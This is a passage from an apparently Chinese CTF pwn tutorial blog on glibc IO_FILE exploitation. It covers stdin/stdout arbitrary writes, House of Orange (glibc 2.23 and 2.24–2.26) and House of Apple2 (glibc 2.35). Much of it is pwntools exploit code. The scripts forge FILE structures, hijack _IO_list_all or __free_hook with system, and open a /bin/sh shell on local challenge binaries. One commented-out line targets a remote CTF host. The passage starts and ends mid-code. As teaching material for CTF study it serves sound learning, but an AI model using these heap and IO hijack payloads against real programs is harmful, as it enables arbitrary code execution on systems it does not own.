class="string">&#x27;,p64(free_hook))</span></span><br><span class="line"><span class="string">bug()</span></span><br><span class="line"><span class="string">edit(b&#x27;</span><span class="number">-3</span><span class="string">&#x27;,p64(system_))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">edit(b&#x27;</span><span class="number">2</span><span class="string">&#x27;,b&#x27;</span>/bin/sh\x00<span class="string">&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">dele(b&#x27;</span><span class="number">2</span><span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure>
+
+<p>首先我们看一下</p>
+<p>edit(b’-11’,b’\x48’)这个</p>
+<p><img src="/2025/11/18/IO/1754546583048-fc4d30e8-bba9-4629-a551-08e7cac4fad5.png" alt="img"><br>我们可以看到他这个是指向自己的，也就是通过二级指针该自己的内容，那我们可以把他改成别的来看一下</p>
+<p><img src="/2025/11/18/IO/1754546649761-9cb83f94-8426-46c4-950a-de98fe7e36ec.png" alt="img"></p>
+<p>就像这样</p>
+<p>edit(b’-11’,p64(free_hook))</p>
+<p>然后我们改他把free_hook写进去，然后通过completed这个指针就可以改free_hook的内容了</p>
+<p>edit(b’-3’,p64(system_))</p>
+<p><img src="/2025/11/18/IO/1754546775684-81f42a87-84ef-4d01-b8b6-8532ebfb1a90.png" alt="img"></p>
+<p>就像这样</p>
+<p>edit(b’-8’,p64(0xfbad1800)+p64(0)*3+b’\x00’)</p>
+<p>这个就是改IO_FILE的不再解释了</p>
+<p><img src="/2025/11/18/IO/1754546990292-95e861ee-20cb-4e3c-ae83-fec4465f14c0.png" alt="img"></p>
+<h1 id="2-stdin标准输入缓冲区进行任意地址写"><a href="#2-stdin标准输入缓冲区进行任意地址写" class="headerlink" title="2.stdin标准输入缓冲区进行任意地址写"></a>2.<code>stdin</code>标准输入缓冲区进行任意地址写</h1><ol>
+<li>设置<code>_IO_read_end</code>等于<code>_IO_read_ptr</code>。</li>
+<li>设置<code>_flag &amp;~ _IO_NO_READS</code>即<code>_flag &amp;~ 0x4</code>（<strong>清除</strong> <code>**_flag**</code> <strong>中第 2 位</strong>）。</li>
+<li>设置<code>_fileno</code>为0。</li>
+<li>设置<code>_IO_buf_base</code>为<code>write_start</code>，<code>_IO_buf_end</code>为<code>write_end</code>；且使得<code>_IO_buf_end-_IO_buf_base</code>大于fread要读的数据。（fread）</li>
+</ol>
+<p>在<code>_IO_new_file_underflow</code>函数中先判断<code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code>是否成立，成立则直接返回，因此再次要求伪造的结构体<code>_IO_read_end ==_IO_read_ptr</code>，绕过该条件检查。</p>
+<p>接着函数会检查<code>_flags</code>是否包含<code>_IO_NO_READS</code>标志，包含则直接返回。标志的定义是<code>#define _IO_NO_READS 4</code>，因此<code>_flags</code>不能包含<code>4</code>。</p>
+<p>最终系统调用<code>_IO_SYSREAD (fp, fp-&gt;_IO_buf_base,fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)</code>读取数据，因此要想利用<code>stdin</code>输入缓冲区需设置FILE结构体中<code>_IO_buf_base</code>为<code>write_start</code>，<code>_IO_buf_end</code>为<code>write_end</code>。同时也需将结构体中的<code>fp-&gt;_fileno</code>设置为0，最终调用<code>read (fp-&gt;_fileno, buf, size))</code>读取数据。</p>
+<p>利用：任意地址写一个0利用，将<code>_IO_buf_base</code>最后一位写成0，第二次再写就会往这里写，从而完全控制</p>
+<p><img src="/2025/11/18/IO/1761139985999-f30b66a1-bc8c-4edf-a133-f72e948f4f08.png" alt="img"></p>
+<h1 id="3-stdout标准输入缓冲区进行任意地址写"><a href="#3-stdout标准输入缓冲区进行任意地址写" class="headerlink" title="3.stdout标准输入缓冲区进行任意地址写"></a>3.<code>stdout</code>标准输入缓冲区进行任意地址写</h1><p>任意写功能的实现在于IO缓冲区没有满时，会先将要输出的数据复制到缓冲区中，可通过这一点来实现任意地址写的功能。可以看到任意写好像很简单，只需将<code>_IO_write_ptr</code>指向<code>write_start</code>，<code>_IO_write_end</code>指向<code>write_end</code>即可（fwrite）</p>
+<h1 id="4-House-of-Orange"><a href="#4-House-of-Orange" class="headerlink" title="4.House of Orange"></a>4.House of Orange</h1><h2 id="2-23"><a href="#2-23" class="headerlink" title="2.23"></a>2.23</h2><p>没有free通过改top chunk来实现，house of 系列里面讲过了</p>
+<p>具体讲io部分</p>
+<p><img src="/2025/11/18/IO/1756317776625-be280451-9e40-4314-844d-5f22477be507.png" alt="img"><img src="/2025/11/18/IO/1756317788120-47fd1fd8-8373-489f-9b56-83f676e39e4a.png" alt="img"></p>
+<ul>
+<li>通过unsortbin attack往任意地址写入一个大的值（也就是main_arean+88）这个unsortbin attack有讲忘了自己去看，我们可以往_IO_list_all写入main_arean+88，main_arean+88+0x68这个偏移就是chain字段，而这个地址刚好是smallbin中size为0x60的数组，我们往大小为0x60的smallbin中写数据就正好是往chain字段这个地址中写，就可以构造结构体</li>
+</ul>
+<p>具体构造</p>
+<p>将_flags字段写入&#x2F;bin&#x2F;sh</p>
+<p>将 _IO_write_ptr改成0x1</p>
+<p>将 _IO_write_end改成0x0</p>
+<p>将_mode改成0</p>
+<p>将chain构造为&amp;flags</p>
+<p>将vtable的地址改成&amp;vtable</p>
+<p>然后在vtable字段后再跟16个字节的0最后写上system函数的地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/he/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Your choice : &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Length of name :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Name :&#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Price of Orange:&#x27;</span>)</span><br><span class="line">    p.send(<span class="string">b&#x27;20&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Color of Orange:&#x27;</span>)</span><br><span class="line">    p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Your choice : &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Length of name :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Name:&#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Price of Orange:&#x27;</span>)</span><br><span class="line">    p.send(<span class="string">b&#x27;20&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Color of Orange:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;chunk0&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0xfa1</span>)</span><br><span class="line">edit(<span class="number">0x100</span>,payload)</span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">b&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">b&#x27;cccccccc&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Your choice : &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3c4b78</span>-<span class="number">0x610</span></span><br><span class="line">io_list_all=libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">pause()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(io_list_all))</span><br><span class="line">edit(<span class="number">0x10</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">15</span>+<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Your choice : &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;db&#x27;</span>)</span><br><span class="line">heap_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">sys_addr = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr+<span class="number">0x430</span>))</span><br><span class="line">pause()</span><br><span class="line">payload= <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x400</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>)+p64(<span class="number">0</span>)+p64(io_list_all-<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)*<span class="number">7</span>+p64(heap_addr+<span class="number">0x430</span>)+p64(<span class="number">0</span>)*<span class="number">13</span>+p64(heap_addr+<span class="number">0x508</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(sys_addr)</span><br><span class="line">bug()</span><br><span class="line">edit(<span class="number">0x1000</span>,payload)</span><br><span class="line">bug()</span><br><span class="line">p.interactive()</span><br><span class="line">payload=<span class="string">b&#x27;f&#x27;</span>*<span class="number">0x400</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)  <span class="comment">#堆溢出覆盖</span></span><br><span class="line">payload+=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>) flags字段，且将size位伪造为<span class="number">0x61</span>，进入smallbin</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(io_list_all-<span class="number">0x10</span>) fd和bk</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)<span class="comment">#_IO_write_base &amp; _IO_write_ptr</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+=p64(leak_heap+<span class="number">0x430</span>)<span class="comment">#chain</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">13</span></span><br><span class="line">payload+=p64(leak_heap+<span class="number">0x508</span>)<span class="comment">#vtable</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(sys_addr)<span class="comment">#DUMMY finish overflow</span></span><br></pre></td></tr></table></figure>
+
+<p>将chain字段构造为flags的地址，也就是smallbins的头部</p>
+<p><img src="/2025/11/18/IO/1756318696382-a2660f42-da02-4508-a89e-b47f07581bc0.png" alt="img"><img src="/2025/11/18/IO/1756318720210-a1410223-3a0d-4c98-ac62-a84e8f5c228c.png" alt="img"></p>
+<p>将vtable就写成vtable所在的地址</p>
+<p><img src="/2025/11/18/IO/1756318912707-dd71d112-1cd9-413a-a17b-4d391ed4b228.png" alt="img"></p>
+<p>原理：因为unsortedbin得链表已经被破坏，在遍历链表的时候就发生错误，就会调用errout，而errout调用的是malloc_printerr，其又主要调用了_libc_message函数，又调用了abort，而about中调用fflush（NULL）</p>
+<p><img src="/2025/11/18/IO/1756367402001-75ea793f-036a-4125-9bed-8f1ddebb082e.jpeg" alt="img"></p>
+<p>将vtable就写成vtable所在的地址，往后面第四个写system地址（虚表中overflow就位于第四个），也就相当于调用system并且将链表头部节点作为参数也就是&#x2F;bin&#x2F;sh的地址，就调用了system（&#x2F;bin&#x2F;sh）获得shell</p>
+<h2 id="2-24-2-26"><a href="#2-24-2-26" class="headerlink" title="2.24-2.26"></a>2.24-2.26</h2><p>2.24-2.26 加入虚表保护，虚表需要在一定范围里面这时候在这样构造</p>
+<p><img src="/2025/11/18/IO/1756626660579-1b6052a1-a9ea-4950-81c9-e5118efaaea9.png" alt="img"></p>
+<p><strong>_IO_str_finish</strong></p>
+<p><img src="/2025/11/18/IO/1757332053371-c86312db-ff23-4f91-9e97-e5ce1087280a.png" alt="img"></p>
+<p>将&#x2F;bin&#x2F;sh地址写在偏移0x38的地方也就是IO_buf_base </p>
+<p>将system写在偏移0xe8的地方</p>
+<p>这样就会调用system(&#x2F;bin&#x2F;sh)</p>
+<p>查找IO_str_jumps</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ref_offset <span class="keyword">in</span> libc.search(p64(IO_str_underflow_offset)):</span><br><span class="line">    possible_IO_str_jumps_offset = ref_offset - <span class="number">0x20</span></span><br><span class="line">    <span class="keyword">if</span> possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:</span><br><span class="line">        <span class="built_in">print</span> (<span class="built_in">hex</span>(possible_IO_str_jumps_offset))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">payload=<span class="string">b&#x27;f&#x27;</span>*<span class="number">0x400</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)  <span class="comment">#堆溢出覆盖</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>) flags字段，且将size位伪造为<span class="number">0x61</span>，进入smallbin</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(io_list_all-<span class="number">0x10</span>) fd和bk</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)<span class="comment">#_IO_write_base &amp; _IO_write_ptr</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(bin_sh)+p64(<span class="number">0</span>)*<span class="number">5</span> <span class="comment">#IO_buf_base = &amp;/bin/sh offset = 0x38(7)</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#chain</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">13</span></span><br><span class="line">payload+=p64(IO_str_jumps-<span class="number">0x8</span>)<span class="comment">#vtable</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(sys_addr) <span class="comment">#IO file offset = 0xe8 (29)</span></span><br></pre></td></tr></table></figure>
+
+<p>2.27</p>
+<p>2.27开始移除了abort函数中的fflush(NULL)，劫持_IO_list_all就失效了</p>
+<p>2.29 </p>
+<p>2.29开始虚表是可以写的，如果有任意地址写的漏洞可以直接改虚表函数指针</p>
+<h1 id="4-House-of-Apple2"><a href="#4-House-of-Apple2" class="headerlink" title="4.House of Apple2"></a>4.House of Apple2</h1><h2 id="（1）2-35House-of-Apple2（system）"><a href="#（1）2-35House-of-Apple2（system）" class="headerlink" title="（1）2.35House of Apple2（system）"></a>（1）2.35House of Apple2（system）</h2><h3 id="执行exit的流程："><a href="#执行exit的流程：" class="headerlink" title="执行exit的流程："></a>执行exit的流程：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_overflow</span><br><span class="line">--&gt;&gt;_IO_wdoallocbuf</span><br><span class="line">    --&gt;&gt;_IO_WDOALLOCATE</span><br><span class="line">        --&gt;&gt;*(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)/</span><br><span class="line">            *(fp-&gt;_wide_data-&gt;_wide_vtable-&gt;_doallocate)(fp)</span><br></pre></td></tr></table></figure>
+
+<p>f-&gt;flags!&#x3D;0x8  &amp;&amp;  f-&gt;flags!&#x3D;0x800 &amp;&amp; f-&gt;flags!&#x3D;0x2</p>
+<p>vtable设置为_IO_wfile_jumps使其能成功调用_IO_wfile_overflow即可</p>
+<p>_wide_data设置为可控堆地址heap_addr1，即满足*(f + 0xa0) &#x3D; heap_addr1</p>
+<p>_wide_data-&gt;_IO_write_base设置为0，即满足*(heap_addr1 + 0x18) &#x3D; 0</p>
+<p>_wide_data-&gt;_IO_buf_base设置为0，即满足*(heap_addr1 + 0x30) &#x3D; 0</p>
+<p>_wide_data-&gt;_wide_vtable设置为可控堆地址heap_addr2，即满足*(heap_addr1 + 0xe0) &#x3D; heap_addr2</p>
+<p>_wide_data-&gt;_wide_vtable-&gt;doallocate设置为地址C用于劫持执行流，即满足*(heap_addr2 + 0x68) &#x3D; C</p>
+<p><img src="/2025/11/18/IO/1757484619981-c66360a3-783a-4b93-a0d1-d3ed9575e3a8.png" alt="img"></p>
+<h3 id="这里回答一些问题？"><a href="#这里回答一些问题？" class="headerlink" title="这里回答一些问题？"></a>这里回答一些问题？</h3><h4 id="1-为什么要将虚表的地址写为IO-wfile-jumps"><a href="#1-为什么要将虚表的地址写为IO-wfile-jumps" class="headerlink" title="1.为什么要将虚表的地址写为IO_wfile_jumps"></a>1.为什么要将虚表的地址写为IO_wfile_jumps</h4><p>因为我们将stderr劫持了，虚表的地址就变化了，他就调用_IO_vtable_check检查，但是我们将虚表的地址改为IO_wfile_jumps，他就不会触发保护、</p>
+<h4 id="2-heap2为什么要这样布局"><a href="#2-heap2为什么要这样布局" class="headerlink" title="2.heap2为什么要这样布局"></a>2.heap2为什么要这样布局</h4><p><img src="/2025/11/18/IO/1757425507971-b25c787d-a50b-4337-a54a-ef2ae59e9977.png" alt="img"></p>
+<p>我们可以看到 rax &#x3D; {rax+0xe0(28)这个地方的地址}</p>
+<p>其实就是wide_data的vtable </p>
+<p>也就是rax &#x3D; {wide_data的vtable}的值</p>
+<p>我们将vtable的值写成了heap2的头也就是</p>
+<p>rax就是heap2的地址</p>
+<p>然后取出call &#x3D; rax+0x68这个地址里面的值</p>
+<p>也就是我们需要将system的地址写入上面这个rax+0x68这个地方(这里其实就是__doallocate)</p>
+<p>我们将rax+0xe8(28)这个地方写入一个地址就写heap2的头地址，然后heap2+0x68(13)写system的地址就可以</p>
+<p>3.为什么要把sh；写在heap1的pre_size位，以及为什么是sh；</p>
+<p>这里关键就是要找rdi的赋值</p>
+<p><img src="/2025/11/18/IO/1757430398318-32e1807d-a579-4bdc-9901-bfca0bfbe677.png" alt="img"></p>
+<p>我们可以看到r15的值是rip+0x18cd1e这个地方的值</p>
+<p>而这个值就是_IO_list_all这个地址中的值，这个地址中本来放的是stderr，我们通过largebinattack改成了heap1的头地址</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(listall<span class="number">-0x20</span>))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x500</span>)</span><br></pre></td></tr></table></figure>
+
+<p>r15 &#x3D; heap1的头地址</p>
+<p><img src="/2025/11/18/IO/1757430524893-6c4c2ba4-24ce-4e2e-8a2c-fe862b95cd11.png" alt="img"></p>
+<p>rdi &#x3D; heap1的头地址</p>
+<p>往heap1的头地址写入&#x2F;bin&#x2F;sh（其实就是pre_size &#x3D; &#x2F;bin&#x2F;sh），rdi就为&#x2F;bin&#x2F;sh的地址</p>
+<p>但是其值不满足flags的条件所以改为空格sh;</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x450</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x428</span>) #末尾为<span class="number">0x8</span>可以改下一个的pre_size位</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x440</span>)</span><br><span class="line">edit(<span class="number">1</span>,b<span class="string">&#x27;a&#x27;</span>*<span class="number">0x420</span>+b<span class="string">&#x27; sh;&#x27;</span>)</span><br><span class="line">#fake_io = p64(<span class="number">0</span>) <span class="meta">#flags </span></span><br><span class="line">#fake_io += p64(<span class="number">0</span>)#IO read ptr</span><br><span class="line">fake_io = p64(<span class="number">0</span>)#IO read end</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#I0 read base</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#IO write base</span><br><span class="line">fake_io += p64(<span class="number">1</span>)#IO write ptr</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#IO write end</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#IO buf base</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#IO buf end</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#_IO_save_base</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#_IO_backup_base</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#_IO_save_end</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#_markers</span><br><span class="line">fake_io += p64(<span class="number">0</span>)<span class="meta">#chain</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)</span><br><span class="line">fake_io += p64(<span class="number">0xffffffffffffffff</span>)#old_offset</span><br><span class="line">fake_io += p64(<span class="number">0</span>)</span><br><span class="line">fake_io += p64(addr1)</span><br><span class="line">fake_io += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">fake_io += p64(addr2)#_wide_data</span><br><span class="line">fake_io += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_io += p64(_IO_wfile_jumps)<span class="meta">#vtable</span></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">11</span>+p64(system)+p64(<span class="number">0</span>)*<span class="number">14</span>+p64(addr2))</span><br><span class="line">from pwn import *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="meta">#context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="meta">#p = remote(<span class="string">&#x27;node2.anna.nssctf.cn&#x27;</span>,28168)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">def add(idx,size):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;choice:&#x27;</span>)</span><br><span class="line">    p.send(b<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(b<span class="string">&#x27;index:&#x27;</span>)</span><br><span class="line">    p.send(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;size:&#x27;</span>)</span><br><span class="line">    p.send(str(size))</span><br><span class="line"></span><br><span class="line">def <span class="built_in">free</span>(idx):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;choice:&#x27;</span>)</span><br><span class="line">    p.send(b<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(b<span class="string">&#x27;index:&#x27;</span>)</span><br><span class="line">    p.send(str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;choice:&#x27;</span>)</span><br><span class="line">    p.send(b<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(b<span class="string">&#x27;index:&#x27;</span>)</span><br><span class="line">    p.send(str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx,content):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;choice:&#x27;</span>)</span><br><span class="line">    p.send(b<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(b<span class="string">&#x27;index:&#x27;</span>)</span><br><span class="line">    p.send(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;content:&#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line">def bug():</span><br><span class="line">    gdb.attach(p)</span><br><span 